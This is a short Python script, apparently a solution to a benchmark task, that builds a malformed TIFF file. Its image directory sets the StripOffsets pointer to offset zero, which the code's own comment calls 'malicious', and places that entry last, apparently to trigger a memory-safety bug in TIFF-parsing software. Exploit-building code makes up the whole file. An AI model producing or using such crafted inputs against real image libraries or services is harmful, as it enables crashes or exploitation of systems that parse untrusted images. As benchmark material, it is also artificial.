import struct
from typing import List, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        le = "<"

        def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int, inline_short: int | None = None) -> bytes:
            if inline_short is not None:
                vo = struct.pack(le + "H", inline_short) + b"\x00\x00"
            else:
                vo = struct.pack(le + "I", value_or_offset & 0xFFFFFFFF)
            return struct.pack(le + "HHI", tag & 0xFFFF, typ & 0xFFFF, count & 0xFFFFFFFF) + vo

        # TIFF header: little-endian, magic 42, first IFD at offset 8
        out = bytearray()
        out += b"II"
        out += struct.pack(le + "H", 42)
        out += struct.pack(le + "I", 8)

        # Build IFD with 9 entries; make StripOffsets (offline) with value offset == 0 as the last entry.
        # Use 8 strips so StripOffsets/StripByteCounts are offline (32 bytes) and consistent with ImageLength/RowsPerStrip.
        num_strips = 8
        bytecounts_offset = 8 + 2 + 9 * 12 + 4  # header + num_entries + entries + next_ifd_offset

        entries: List[bytes] = []
        entries.append(ifd_entry(256, 4, 1, 1))                 # ImageWidth = 1
        entries.append(ifd_entry(257, 4, 1, num_strips))        # ImageLength = 8
        entries.append(ifd_entry(258, 3, 1, 0, inline_short=8)) # BitsPerSample = 8
        entries.append(ifd_entry(259, 3, 1, 0, inline_short=1)) # Compression = 1 (None)
        entries.append(ifd_entry(262, 3, 1, 0, inline_short=1)) # Photometric = 1 (BlackIsZero)
        entries.append(ifd_entry(277, 3, 1, 0, inline_short=1)) # SamplesPerPixel = 1
        entries.append(ifd_entry(278, 4, 1, 1))                 # RowsPerStrip = 1
        entries.append(ifd_entry(279, 4, num_strips, bytecounts_offset))  # StripByteCounts (valid data)
        entries.append(ifd_entry(273, 4, num_strips, 0))         # StripOffsets (offline) with offset==0 (malicious, last)

        out += struct.pack(le + "H", len(entries))
        for e in entries:
            out += e
        out += struct.pack(le + "I", 0)  # next IFD offset

        # StripByteCounts array (8 LONGs, each 1 byte)
        for _ in range(num_strips):
            out += struct.pack(le + "I", 1)

        return bytes(out)